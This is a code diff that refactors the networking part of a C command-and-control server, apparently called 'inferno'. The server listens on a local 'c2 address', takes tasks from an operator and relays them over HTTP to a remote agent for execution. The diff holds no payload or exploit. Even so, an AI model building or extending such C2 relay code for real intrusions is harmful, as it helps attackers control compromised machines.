@@ -4,13 +4,12 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
-#define IP "127.0.0.1"
-#define PORT_TCP 33333
-#define PORT_HTTP 80
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-
+#define IP "127.0.0.1"
+#define PORT_TCP 33333
+#define PORT_HTTP 80
 
 //handle erros
 void error(char *message) {
@@ -24,6 +23,9 @@ int http_listener(int http_listener_socket);
 //transfering over HTTP payload and receiving payload results
 char *http_transfer(int http_listener_accept, char *task);
 
+//the netorking part
+void networking(int inferno_socket);
+
 int main() {
     int session = 0;
 
@@ -33,29 +35,12 @@ int main() {
     if (inferno_socket == -1)
         error("Socket creation failed");
 
-    //preparing address tcp
-    struct sockaddr_in c2_address;
-    memset(&c2_address, 0, sizeof(c2_address));
-    c2_address.sin_family = AF_INET;
-    c2_address.sin_port = htons(PORT_TCP);
-    c2_address.sin_addr.s_addr = inet_addr(IP);
-    
     //http socket
     int http_listener_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (http_listener_socket == -1)
         error("HTTP socket creation failed");
 
-    //bind tcp
-    printf("Binding socket to c2 address...\n");
-    int inferno_bind = bind(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
-    if (inferno_bind == -1) 
-        error("Binding socket failed");
-
-    //listen tcp
-    printf("Listening to %s:%d\n", IP, PORT_TCP);
-    int inferno_listen = listen(inferno_socket, 0);
-    if (inferno_listen == -1) 
-        error("Listening failed");
+    networking(inferno_socket);
 
     while (1) {
         //accept tcp
@@ -106,7 +91,7 @@ int main() {
                 //receive from client
                 recv(inferno_accept, inside, sizeof(inside), 0);
                 printf("Receiving from client:\n%s\n", inside);
-                
+
                 //transfering (receiving/sending to agent)
                 executed = http_transfer(http_listener_accept, inside);
                 
@@ -190,3 +175,23 @@ char *http_transfer(int http_listener_accept, char *task) {
      return executed;
 }
 
+void networking(int inferno_socket) {
+    //preparing address tcp
+    struct sockaddr_in c2_address;
+    memset(&c2_address, 0, sizeof(c2_address));
+    c2_address.sin_family = AF_INET;
+    c2_address.sin_port = htons(PORT_TCP);
+    c2_address.sin_addr.s_addr = inet_addr(IP);
+
+    //bind tcp
+    printf("Binding socket to c2 address...\n");
+    int inferno_bind = bind(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
+    if (inferno_bind == -1) 
+        error("Binding socket failed");
+
+    //listen tcp
+    printf("Listening to %s:%d\n", IP, PORT_TCP);
+    int inferno_listen = listen(inferno_socket, 0);
+    if (inferno_listen == -1) 
+        error("Listening failed");
+}
